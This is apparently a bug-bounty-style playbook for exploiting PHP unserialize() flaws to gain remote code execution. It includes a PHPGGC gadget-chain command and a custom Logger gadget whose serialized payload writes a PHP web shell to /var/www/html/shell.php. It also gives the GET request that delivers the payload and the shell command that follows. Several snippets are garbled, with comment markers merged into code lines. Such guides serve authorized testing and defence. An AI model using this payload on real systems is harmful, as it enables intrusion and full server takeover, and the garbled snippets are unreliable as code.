# PHP Deserialization to RCE

## When to Use
- During a web application assessment where user-supplied input is passed to PHP's `unserialize()` function.
- Often found in base64-encoded or URL-encoded cookies, hidden form fields, or API endpoints handling legacy architecture.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying the Sink

Look for patterns indicating serialized PHP objects Prefixes like `O:4:"User":2:{...}`
- Search source code for `unserialize($_GET['data'])` or `unserialize(base64_decode($_COOKIE['session']))`

```php
// Vulnerable Code Example $input = $_GET['payload'];
$obj = unserialize($input); // DANGER
```

### Phase 2: Utilizing PHPGGC (PHP Generic Gadget Chains)

If the target is using known frameworks/libraries (e.g., Laravel, Symfony, Monolog, SwiftMailer), you can generate a POP chain payload automatically.

```bash
# phpggc -l # List available gadget chains

# Generate a payload for Laravel/RCE1 to execute 'id' phpggc Laravel/RCE1 system 'id' --base64
```

### Phase 3: Writing a Custom Gadget Chain

If standard framework gadgets aren't available, you must review the source code for class definitions containing "Magic Methods" (e.g., `__wakeup()`, `__destruct()`, `__toString()`).

```php
# class Logger {
    public $logFile;
    public $initMsg;

    public function __destruct() {
        file_put_contents($this->logFile, $this->initMsg);
    }
}

// Crafting the payload $payload = new Logger();
$payload->logFile = "/var/www/html/shell.php";
$payload->initMsg = "<?php system($_GET['cmd']); ?>";
echo serialize($payload);
// Output: O:6:"Logger":2:{s:7:"logFile";s:23:"/var/www/html/shell.php";s:7:"initMsg";s:30:"<?php system($_GET['cmd']); ?>";}
```

### Phase 4: Executing the Attack

Submit the serialized payload (URL-encoded or Base64-encoded if necessary) to the vulnerable endpoint.

```http
# GET /vulnerable.php?payload=O:6:"Logger":2:{s:7:"logFile";s:23:"/var/www/html/shell.php";s:7:"initMsg";s:30:"<?php system($_GET['cmd']); ?>";} HTTP/1.1
Host: target.app
```
Access `shell.php?cmd=id`.
